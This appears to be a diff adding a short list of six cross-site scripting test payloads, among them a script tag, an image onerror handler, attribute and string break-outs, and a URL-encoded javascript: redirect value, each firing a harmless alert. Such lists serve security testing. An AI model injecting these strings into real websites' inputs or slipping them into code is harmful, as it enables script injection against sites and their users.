@@ -1,0 +1,11 @@
+1. <script>alert('xss')</script>
+
+2.<img src='aaaa' onerror='alert("xss")'>
+
+3. ' onerror='alert("xss")'>
+
+4. ');alert('xss
+
+5. next=javascript%3Aalert%28%27xss%27%29
+
+6. frame#data:text/plain,alert('xss')
